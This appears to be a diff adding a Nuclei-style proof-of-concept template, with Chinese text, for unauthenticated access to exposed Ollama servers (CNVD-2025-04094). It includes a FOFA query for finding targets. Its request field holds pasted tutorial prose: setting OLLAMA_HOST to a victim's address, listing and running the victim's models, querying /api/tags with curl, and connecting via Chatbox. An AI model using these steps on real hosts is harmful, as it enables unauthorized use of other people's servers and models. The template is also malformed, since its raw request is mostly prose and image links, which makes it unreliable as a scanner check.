@@ -1,0 +1,19 @@
+id: poc-ga6guumugcyygzyv
+info:
+  name: OLLAMA 未授权访问（CNVD-2025-04094）
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ga6guumugcyygzyv'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ga6guumugcyygzyv
+    fofa: app="Ollama"
+http:
+- raw:
+  - "方法一：\n本地需要搭建一个ollama服务\npowershell设置目标主机地址\n$env:OLLAMA_HOST=\"ip:port\"\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1741000817863-091b8da8-1af1-44bd-afee-cc645749d122.png)\n 连接后查询\nollama list\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1741000818004-71b8e191-42bd-4c31-afef-94da2b6b06d6.png)\n调用连接地址模型\nollama run deepseek-r1:70b\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1741000818162-c47081b7-734d-4f6c-a4cb-49e1af3c08fc.png)\n 方法二：\n简单粗暴的直接使用curl命令执行\ncurl your-ip:port/api/tags\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1741000818393-bcf897e2-6252-48d7-a6d7-87668a5bdd98.png)\nGET /api/tags HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: {{Hostname}}\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1741000818724-be569899-299f-4817-b7e1-1b0b8cb90c8b.png)\n方法三：\nchatbox连接访问 配置访问地址\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1741000818958-565215ce-a93f-4c30-a3e3-055c6c3d64b0.png)\n选中配置的模型\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1741000819196-0c28c717-b394-4db2-933f-b64287954793.png)"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
